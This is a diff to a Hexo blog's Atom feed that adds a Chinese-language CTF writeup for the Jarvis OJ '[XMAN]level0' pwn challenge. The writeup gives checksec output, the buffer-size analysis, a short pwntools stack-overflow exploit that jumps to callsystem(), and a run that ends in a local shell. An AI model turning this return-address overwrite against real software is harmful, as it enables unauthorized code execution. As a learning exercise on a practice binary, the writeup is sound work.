@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-03-21T03:25:20.219Z</updated>
+  <updated>2018-03-21T07:47:48.084Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -14,6 +14,51 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Jarvis OJ Pwn writeup</title>
+    <link href="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/"/>
+    <id>http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/</id>
+    <published>2018-03-21T07:16:36.000Z</published>
+    <updated>2018-03-21T07:47:48.084Z</updated>
+    
+    <content type="html"><![CDATA[<p>此篇记录关于Jarvis OJ Pwn所有题目的writeup</p>
+<h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/home/ios/Desktop/pwn0'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
+<ul>
+<li><a id="more"></a>
+<the rest="" of="" contents="" |="" 余下全文=""><br>NX开启 栈溢出保护关闭 <h4 id="附件拖入ida"><a href="#附件拖入ida" class="headerlink" title="附件拖入ida"></a>附件拖入ida</h4></the></li>
+</ul>
+<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg" alt="ida"></p>
+<p>main函数里跳转到了vulnerable_function()</p>
+<h4 id="跟进"><a href="#跟进" class="headerlink" title="跟进"></a>跟进</h4><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/2.jpg" alt="ida1"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">可以看到<span class="built_in">read</span>可读的大小为0x200 512字节</div><div class="line">buf大小为0x80字节</div></pre></td></tr></table></figure>
+<h4 id="查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><a href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell" class="headerlink" title="查看函数窗口 找到callsystem() 查看代码发现已经写好了shell"></a>查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</h4><p>屡一下流程 main函数跳转到了vulnerable_function()然后 read一个大小不超过512的字节 然后返回函数</p>
+<p>思路很清晰了 我们需要将vulnerable_function()函数的返回地址覆盖为callsystem()函数的地址即可成功getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">buf <span class="number">0x80</span></div><div class="line">ebp <span class="number">0x8</span></div><div class="line">淹没bp <span class="number">0x80</span>+<span class="number">0x8</span></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div></pre></td></tr></table></figure>
+<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn0'</span>)</div><div class="line"></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span> +p64(callsystem_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~/Desktop$ python pwn0.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./pwn0'</span>: pid 3517</div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ ls</div><div class="line">core               peda-session-pwn50.txt  pwn0.py    pwn50.py</div><div class="line">peda-session-pwn0.txt  pwn0               pwn50</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>成功getshell</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;此篇记录关于Jarvis OJ Pwn所有题目的writeup&lt;/p&gt;
+&lt;h2 id=&quot;XMAN-level0&quot;&gt;&lt;a href=&quot;#XMAN-level0&quot; class=&quot;headerlink&quot; title=&quot;[XMAN]level0&quot;&gt;&lt;/a&gt;[XMAN]level0&lt;/h2&gt;&lt;h4 id=&quot;进行chack&quot;&gt;&lt;a href=&quot;#进行chack&quot; class=&quot;headerlink&quot; title=&quot;进行chack&quot;&gt;&lt;/a&gt;进行chack&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[*] &lt;span class=&quot;string&quot;&gt;&#39;/home/ios/Desktop/pwn0&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Arch:     amd64-64-little&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RELRO:    No RELRO&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Stack:    No canary found&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NX:       NX enabled&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    PIE:      No PIE (0x400000)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
+    
+      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    
+      <category term="Jarvis OJ" scheme="http://iosmosis.github.io/tags/Jarvis-OJ/"/>
+    
+      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
+    
+  </entry>
   
   <entry>
     <title>When Did You Born</title>
